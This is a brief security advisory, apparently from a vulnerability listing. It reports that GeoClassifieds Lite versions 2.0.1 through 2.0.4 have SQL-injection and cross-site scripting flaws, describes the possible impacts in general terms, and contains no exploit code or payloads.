GeoClassifieds Lite is prone to multiple SQL-injection and cross-site scripting vulnerabilities.

Exploiting these issues could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.

GeoClassifieds Lite 2.0.1, 2.0.3.1, 2.0.3.2 and 2.0.4 are vulnerable; other versions may also be affected.
